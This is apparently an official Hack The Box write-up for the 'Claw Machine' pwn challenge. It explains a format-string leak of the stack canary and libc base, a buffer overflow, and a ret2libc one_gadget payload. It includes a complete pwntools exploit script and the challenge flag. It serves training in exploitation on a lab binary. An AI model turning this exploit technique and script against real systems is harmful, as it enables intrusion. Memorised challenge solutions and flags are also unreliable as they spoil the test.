![](assets/banner.png)



<img src="assets/htb.png" style="margin-left: 20px; zoom: 80%;" align=left />    	<font size="10">Claw Machine</font>

​		30<sup>th</sup> August 2023 / Document No. DYY.102.XX

​		Prepared By: w3th4nds

​		Challenge Author(s): w3th4nds

​		Difficulty: <font color=orange>Medium</font>

​		Classification: Official

 



# Synopsis

Claw Machine is a medium difficulty challenge that features leaking `libc` and `canary` from a fully protected binary with `format string vulnerability`, and then perform a `ret2libc` attack with `one_gadget` due to limited payload size.

## Skills Required

- Basic C, Buffer Overflow, Canary

## Skills Learned

- Leak `canary` and `libc` addresses with `fmt` and perform `ret2libc` with `one_gadget`.

# Enumeration

First of all, we start with a `checksec`:  

```console
pwndbg> checksec
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./glibc/'
```

### Protections 🛡️

As we can see:

| Protection | Enabled  | Usage   |
| :---:      | :---:    | :---:   |
| **Canary** | ✅      | Prevents **Buffer Overflows**  |
| **NX**     | ✅       | Disables **code execution** on stack |
| **PIE**    | ✅      | Randomizes the **base address** of the binary |
| **RelRO**  | **Full** | Makes some binary sections **read-only** |

The interface of the program looks like this:

![](assets/inter.gif)

The 2 bugs are already visible here:

* A `fmt` vulnerability to leak addresses
* A `buffer overflow`.

### Disassembly ⛏️

Starting with `main()`:

```c
undefined8 main(void)

{
  long lVar1;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  banner();
  moves();
  fb();
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

There are some function calls. `setup()`, `banner()` and `moves()` are not important for the exploitation part, so we will focus on the `fb()`. The only thing we need to know from the `moves` function, is that it breaks the loop when pressing `9`, which is also mentioned at the interface of the program.

`fb()`:

```c
void fb(void)

{
  long in_FS_OFFSET;
  undefined2 local_7b;
  undefined local_79;
  undefined8 local_78;
  undefined8 local_70;
  undefined local_68;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_7b = 0;
  local_79 = 0;
  local_78 = 0;
  local_70 = 0;
  local_68 = 0;
  local_58 = 0;
  local_50 = 0;
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  printf("Would you like to rate our game? (y/n)\n\n>> ");
  read(0,&local_7b,2);
  if (((char)local_7b == 'y') || ((char)local_7b == 'Y')) {
    printf("\nEnter your name: ");
    read(0,&local_78,0x10);
    printf("\nThank you for giving feedback ");
    printf((char *)&local_78);
    printf("\nLeave your feedback here: ");
    read(0,&local_58,0x5e);
  }
  puts("\nThank you for playing!\n");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

This is where all the bugs lie. The first obvious bug is here:

```c
read(0,&local_78,0x10);
printf("\nThank you for giving feedback ");
printf((char *)&local_78);
```

`printf` is printing the address of `local_78` without a format specifier. From the `man 3` page of `printf`.

>     Code such as printf(foo); often indicates a bug, since foo  may  con‐
>     tain  a  % character.  If foo comes from untrusted user input, it may
>     contain %n, causing the printf() call to write to memory and creating
>     a security hole.

Instead of using the `%n` characters to overwrite addresses, we will use the `%p` to leak them. 

Also from the `man 3` page of `printf`:

>        p      The  void *  pointer argument is printed in hexadecimal (as if
>               by %#x or %#lx).

The second bug can be seen here:

```c
local_58 = 0;
local_50 = 0;
local_48 = 0;
local_40 = 0;
local_38 = 0;
local_30 = 0;
local_28 = 0;
local_20 = 0;
<SNIP>
read(0,&local_58,0x5e);
```

This function reads `0x5e` bytes (94 in decimal) to a 64-bytes long buffer (`local_58`), thus leading to a buffer overflow. These 2 bugs are more than enough to gain shell to the system.

#### Exploitation Path

What we need to know-find:

- `Overflow offset` 
- `Canary`
- `libc` 

After we find them, we simply perform a `ret2libc` with `one_gadget`. To find these addresses, I have made a simple fuzzing function in `python`.

We know that:

- `libc` addresses start with `0x7f`
- `Canary` is an 8 byte value ending with `00`.

```python
def fuzzer():
  context.log_level = 'critical'
  for i in range (50):
    r = process(fname)
    r.sendlineafter('>> ', '9')
    r.sendlineafter('>> ', 'y')
    r.sendlineafter('name: ', f'%{i}$p')
    r.recvuntil('giving feedback ')
    leak = r.recvline()[:-1].decode()
    if len(leak) == 14 and '0x7f' in leak:
      print(f'[{i}] Possible LIBC: {leak}')
    elif len(leak) == 18 and '00' in leak:
      print(f'[{i}] Possible CANARY: {leak}')
    r.sendline('a')
    r.close()
```

Running the fuzzer we can see:

```console
Running solver locally..

[1] Possible LIBC: 0x7ffc57c30650
[2] Possible LIBC: 0x7faa30fc78c0
[6] Possible LIBC: 0x7ffe44738a70
[21] Possible CANARY: 0xd06a8ad3a5667400
[22] Possible LIBC: 0x7fffde33fe30
[24] Possible LIBC: 0x7ffca77c4340
[25] Possible CANARY: 0xc3935f89ebe50700
[27] Possible LIBC: 0x7fe0d581bc87
[29] Possible LIBC: 0x7fff504e1c08
[35] Possible LIBC: 0x7ffdeaa08880
[40] Possible LIBC: 0x7fff00000000
[43] Possible LIBC: 0x7fdbf21458d3
[44] Possible LIBC: 0x7fa3b8599638
```

The address at `$21` seems like a possible `canary` value and the address at `$27` like a `libc`. We can verify this in the debugger.

### Debugging 

Running the program in the debugger and giving the `%21$p.%27$p` input as name, we can see if our assumptions were correct. 

```gdb
pwndbg> 
0xce6ad7f539fffa00.0x7ffff7a03c87
0x000055555555545f in fb ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────
*RAX  0x22
 RBX  0x0
 RCX  0x0
 RDX  0x7ffff7dcf8c0 ◂— 0x0
*RDI  0x1
 RSI  0x7fffffffb8f0 ◂— 0x3764613665637830 ('0xce6ad7')
*R8   0x22
*R9   0x7fffffffb76c ◂— 0x2200007fff
*R10  0x0
 R11  0x246
 R12  0x555555554a20 (_start) ◂— xor ebp, ebp
 R13  0x7fffffffe110 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffe010 —▸ 0x7fffffffe030 —▸ 0x555555555570 (__libc_csu_init) ◂— push r15
 RSP  0x7fffffffdf90 —▸ 0x7fffffffe110 ◂— 0x1
*RIP  0x55555555545f (fb+245) ◂— lea rdi, [rip + 0x62a]
─────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────
   0x555555555449 <fb+223>    call   printf@plt                <printf@plt>
 
   0x55555555544e <fb+228>    lea    rax, [rbp - 0x70]
   0x555555555452 <fb+232>    mov    rdi, rax
   0x555555555455 <fb+235>    mov    eax, 0
   0x55555555545a <fb+240>    call   printf@plt                <printf@plt>
 
 ► 0x55555555545f <fb+245>    lea    rdi, [rip + 0x62a]
   0x555555555466 <fb+252>    mov    eax, 0
   0x55555555546b <fb+257>    call   printf@plt                <printf@plt>
 
   0x555555555470 <fb+262>    lea    rax, [rbp - 0x50]
   0x555555555474 <fb+266>    mov    edx, 0x5e
   0x555555555479 <fb+271>    mov    rsi, rax
──────────────────────────────────[ STACK ]───────────────────────────────────
00:0000│ rsp 0x7fffffffdf90 —▸ 0x7fffffffe110 ◂— 0x1
01:0008│     0x7fffffffdf98 ◂— 0xa790000000000
02:0010│     0x7fffffffdfa0 ◂— '%21$p.%27$p\n'
03:0018│     0x7fffffffdfa8 ◂— 0xa702437 /* '7$p\n' */
04:0020│     0x7fffffffdfb0 ◂— 0xa00
05:0028│     0x7fffffffdfb8 ◂— 0x1036640
06:0030│     0x7fffffffdfc0 ◂— 0x0
07:0038│     0x7fffffffdfc8 ◂— 0x0
────────────────────────────────[ BACKTRACE ]─────────────────────────────────
 ► f 0   0x55555555545f fb+245
   f 1   0x555555555552 main+53
   f 2   0x7ffff7a03c87 __libc_start_main+231
──────────────────────────────────────────────────────────────────────────────
pwndbg>
```

We see the 2 values are:

* `0xce6ad7f539fffa00`
* `0x7ffff7a03c87`

The first one is indeed the `canary`.

```gdb
pwndbg> canary
AT_RANDOM = 0x7fffffffe3d9 # points to (not masked) global canary value
Canary    = 0xce6ad7f539fffa00 (may be incorrect on != glibc)
Found valid canaries on the stacks:
00:0000│  0x7fffffffd8f8 ◂— 0xce6ad7f539fffa00
```

The second one is also from the `libc` section.

```gdb
pwndbg> vmmap 0x7ffff7a03c87
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x7ffff79e2000     0x7ffff7bc9000 r-xp   1e7000      0 /home/w3th4nds/github/pwn/[Medium] Claw Machine/htb/glibc/libc.so.6 +0x21c87
```

To find the offset from `libc` base, we simply subtract it (or take the `+0x21c87` value given).

```
pwndbg> p/x 0x7ffff7a03c87-0x7ffff79e2000
$1 = 0x21c87
```

Now that we have the `canary` value and the `libc base` address, the only thing left is to find at which offset we overwrite the return address and with what address to overwrite it. As mentioned before, the buffer is 64 bytes long, so after 8 bytes we overwrite the previous frame pointer, meaning that we start overwriting the `return address` at `72` bytes.

### **One gadget** 💎

[one_gadget](https://github.com/david942j/one_gadget) is actually an offset to `execve("/bin/sh")`. After we have leaked `libc base`, we can just add these offsets to it and spawn shell.

```console
➜  challenge git:(main) ✗ one_gadget glibc/libc.so.6 
0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f302 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a2fc execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

Some restrictions should be satisfied first, luckily the first one is.

# Solution

```python
#!/usr/bin/python3.8
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.log_level = 'critical'

fname = './claw_machine' 

LOCAL = False

os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP}:{PORT}\n')

e      = ELF(fname)
libc   = ELF(e.runpath.decode() + 'libc.so.6')
rop    = ROP(e)

rl     = lambda     : r.recvline()
ru     = lambda x   : r.recvuntil(x)
sla    = lambda x,y : r.sendlineafter(x,y)

def fuzzer():
  context.log_level = 'critical'
  for i in range (50):
    r = process(fname)
    r.sendlineafter('>> ', '9')
    r.sendlineafter('>> ', 'y')
    r.sendlineafter('name: ', f'%{i}$p')
    r.recvuntil('giving feedback ')
    leak = r.recvline()[:-1].decode()
    if len(leak) == 14 and '0x7f' in leak:
      print(f'[{i}] Possible LIBC: {leak}')
    elif len(leak) == 18 and '00' in leak:
      print(f'[{i}] Possible CANARY: {leak}')
    r.sendline('a')
    r.close()

# Uncomment to fuzz for addresses
# fuzzer()

# fmt leaks
sla('>> ', '9')
sla('>> ', 'y')
sla('name: ', f'%21$p.%27$p')
ru('giving feedback ')
canary, libc_leak = rl()[:-1].split(b'.')
canary = canary.decode()
libc.address = int(libc_leak.decode(), 16) - 0x21c87
print(f'Canary:    {canary}\nLibc base: {libc.address:#04x}')

# ret2libc with one_gadget
payload = flat({
  72: p64(int(canary, 16)) + p64(rop.find_gadget(['ret'])[0]) +
      p64(libc.address + 0x4f2a5)
})

sla('here: ', payload)

# Print flag
pause(1)
r.sendline('cat flag*')
print(f'\nFlag --> {r.recvline_contains(b"HTB").strip().decode()}\n')
```

```console
Running solver remotely at 0.0.0.0:1337

Canary:    0xbddbabf16562e100
Libc base: 0x7fd4183cf000

Flag --> HTB{gr4b_th3_fl4g_w1th_fmt}
```

